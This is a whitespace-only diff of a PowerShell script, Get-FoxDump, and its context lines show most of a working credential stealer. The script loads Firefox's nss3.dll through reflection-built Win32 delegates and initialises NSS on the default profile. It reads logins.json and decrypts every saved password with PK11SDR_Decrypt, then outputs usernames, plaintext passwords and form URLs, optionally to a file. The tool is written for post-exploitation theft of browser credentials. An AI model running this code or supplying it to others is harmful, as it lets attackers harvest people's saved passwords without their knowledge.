@@ -1,23 +1,23 @@
 
-Function Get-FoxDump 
+Function Get-FoxDump
 {
     <#
-    .SYNOPSIS 
+    .SYNOPSIS
     This script will utilize the api functions within the nss3.dll to decrypt saved passwords. This will only be successfull if the masterpassword has not been set.
 
     .DESCRIPTION
-    This script will utilize the api functions within the nss3.dll to decrypt saved passwords and output them to the pipeline. This will only be successfull if the master 
+    This script will utilize the api functions within the nss3.dll to decrypt saved passwords and output them to the pipeline. This will only be successfull if the master
     password has not been set. The results will include the username, password, and form submit url. This script should work with Firefox version 32 and above. Earlier
-    versions utilized a different storage method for passwords. 
+    versions utilized a different storage method for passwords.
 
     .PARAMETER OutFile
-    Path to the file where the results should be written to. 
+    Path to the file where the results should be written to.
 
     .EXAMPLE
 
-    Get-FoxDump -OutFile "passwords.txt" 
+    Get-FoxDump -OutFile "passwords.txt"
 
-    This will retrieve any saved passwords in firefox and then write them out to a file name passwords.txt. 
+    This will retrieve any saved passwords in firefox and then write them out to a file name passwords.txt.
 
 
     #>
@@ -43,7 +43,7 @@ Function Get-FoxDump
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
- 
+
     .DESCRIPTION
 
     When defining custom enums, structs, and unmanaged functions, it is
@@ -146,7 +146,7 @@ Function Get-FoxDump
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: func
- 
+
     .DESCRIPTION
 
     Add-Win32Type enables you to easily interact with unmanaged (i.e.
@@ -343,7 +343,7 @@ Function Get-FoxDump
             foreach ($Key in $TypeHash.Keys)
             {
                 $Type = $TypeHash[$Key].CreateType()
-            
+
                 $ReturnTypes[$Key] = $Type
             }
 
@@ -363,7 +363,7 @@ Function Get-FoxDump
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
- 
+
     .DESCRIPTION
 
     The 'psenum' function facilitates the creation of enums entirely in
@@ -479,15 +479,15 @@ Function Get-FoxDump
             [Parameter(Position = 0, Mandatory = $True)]
             [UInt16]
             $Position,
-        
+
             [Parameter(Position = 1, Mandatory = $True)]
             [Type]
             $Type,
-        
+
             [Parameter(Position = 2)]
             [UInt16]
             $Offset,
-        
+
             [Object[]]
             $MarshalAs
         )
@@ -512,7 +512,7 @@ Function Get-FoxDump
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: field
- 
+
         .DESCRIPTION
 
         The 'struct' function facilitates the creation of structs entirely in
@@ -679,7 +679,7 @@ Function Get-FoxDump
                 {
                     $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                 }
-            
+
                 $NewField.SetCustomAttribute($AttribBuilder)
             }
 
@@ -724,19 +724,19 @@ Function Get-FoxDump
 
     #http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
 
-    
-   
+
+
     #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
     Function Get-DelegateType
     {
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -751,7 +751,7 @@ Function Get-FoxDump
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
 
@@ -772,7 +772,7 @@ Function Get-FoxDump
 
     $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
     $Kernel32 = $Types['kernel32']
-    
+
     $nssdllhandle = [IntPtr]::Zero
 
     if([IntPtr]::Size -eq 8)
@@ -780,56 +780,56 @@ Function Get-FoxDump
         Throw "Unable to load 32-bit dll's in 64-bit process."
     }
     $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
-    
+
     If(Test-Path $mozillapath)
     {
-        
-        
+
+
         $nss3dll = "$mozillapath\nss3.dll"
-        
+
         $mozgluedll = "$mozillapath\mozglue.dll"
         $msvcr120dll = "$mozillapath\msvcr120.dll"
         $msvcp120dll = "$mozillapath\msvcp120.dll"
-       
+
         if(Test-Path $msvcr120dll)
         {
-         
+
             $msvcr120dllHandle = $Kernel32::LoadLibrary($msvcr120dll)
             $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
             Write-Verbose "Last Error when loading mozglue.dll: $LastError"
-            
-            
+
+
         }
 
         if(Test-Path $msvcp120dll)
         {
-       
-            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll) 
+
+            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll)
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last Error loading mscvp120.dll: $LastError" 
-            
+            Write-Verbose "Last Error loading mscvp120.dll: $LastError"
+
         }
 
         if(Test-Path $mozgluedll)
         {
-            
-            $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll) 
+
+            $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll)
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
             Write-Verbose "Last error loading msvcr120.dll: $LastError"
-            
+
         }
-        
-        
+
+
         if(Test-Path $nss3dll)
         {
-            
+
             $nssdllhandle = $Kernel32::LoadLibrary($nss3dll)
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last Error loading nss3.dll: $LastError"       
-            
+            Write-Verbose "Last Error loading nss3.dll: $LastError"
+
         }
     }
-    
+
 
     if(($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero))
     {
@@ -837,7 +837,7 @@ Function Get-FoxDump
         Write-Verbose "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
         break
     }
-   
+
 
     Function Decrypt-CipherText
     {
@@ -864,7 +864,7 @@ Function Get-FoxDump
 
             if($EmptyTSECItem.SECItemLen -ne 0)
             {
-                $size = $EmptyTSECItem.SECItemLen 
+                $size = $EmptyTSECItem.SECItemLen
                 $dataPtr = $EmptyTSECItem.SECItemData -as [IntPtr]
                 $retval = New-Object byte[] $size
                 [System.Runtime.InteropServices.Marshal]::Copy($dataPtr, $retval, 0, $size)
@@ -887,27 +887,27 @@ Function Get-FoxDump
     $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
-    
+
     $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
-    
+
     $defaultProfile = $(Get-ChildItem $profilePath).FullName
     $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
     Write-Verbose "[+]NSS_Init result: $NSSInitResult"
-    
+
 
     if(Test-Path $defaultProfile)
     {
         #Web.extensions assembly is necessary for handling json files
         try
         {
-           Add-Type -AssemblyName System.web.extensions 
+           Add-Type -AssemblyName System.web.extensions
         }
         catch
         {
             Write-Warning "Unable to load System.web.extensions assembly"
             break
         }
-        
+
 
         $jsonFile = Get-Content "$defaultProfile\logins.json"
         if(!($jsonFile))
@@ -918,7 +918,7 @@ Function Get-FoxDump
         $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
         $obj = $ser.DeserializeObject($jsonFile)
 
-        
+
         $logins = $obj['logins']
         $count = ($logins.Count) - 1
         $passwordlist = @()
@@ -930,7 +930,7 @@ Function Get-FoxDump
             $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
             $formUrl = $($logins.GetValue($i)['formSubmitURL'])
             $FoxCreds = New-Object PSObject -Property @{
-                UserName = $user 
+                UserName = $user
                 Password = $pass
                 URL = $formUrl
             }
@@ -959,7 +959,7 @@ Function Get-FoxDump
     {
         Write-Warning "Unable to locate default profile"
     }
-    
+
 
 }
 
@@ -982,4 +982,3 @@ Get-FoxDump
 echo "`n`n`n"
 
 #########################################
-
